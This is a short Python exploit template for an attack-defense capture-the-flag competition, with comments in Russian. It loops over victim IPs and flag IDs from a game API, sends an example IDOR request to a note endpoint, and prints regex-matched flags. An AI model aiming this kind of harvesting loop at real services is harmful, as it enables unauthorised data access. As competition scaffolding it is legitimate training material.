#!/usr/bin/env python3
"""
Шаблон эксплойта под ферму. argv[1]=IP жертвы (опц. argv[2]=flag_id).
Флаги -> STDOUT (flush). Логи -> STDERR. Запуск: python3 sploit_template.py 10.60.10.2
"""
import sys, re, requests

PORT = 5000
TIMEOUT = 6
FLAG_RE = re.compile(r'[A-Z0-9]{31}=')
ATTACK_DATA_URL = "http://<host>/api/client/attack_data"
SERVICE = "<service_name>"

def log(*a):
    print(*a, file=sys.stderr, flush=True)

def get_flag_ids(ip):
    if len(sys.argv) > 2:
        return [sys.argv[2]]
    try:
        data = requests.get(ATTACK_DATA_URL, timeout=TIMEOUT).json()
        return list(data.get(SERVICE, {}).get(ip, []))
    except Exception as e:
        log("attack_data error:", e); return []

def exploit(ip, fid):
    base = f"http://{ip}:{PORT}"
    r = requests.get(f"{base}/note/{fid}", timeout=TIMEOUT)   # пример: IDOR
    for flag in FLAG_RE.findall(r.text):
        print(flag, flush=True)

def main():
    if len(sys.argv) < 2:
        log("usage: sploit.py <victim_ip> [flag_id]"); sys.exit(1)
    ip = sys.argv[1]
    for fid in (get_flag_ids(ip) or [None]):
        try:
            exploit(ip, fid)
        except Exception as e:
            log(f"[{ip}] fid={fid} err={e}")

if __name__ == "__main__":
    main()
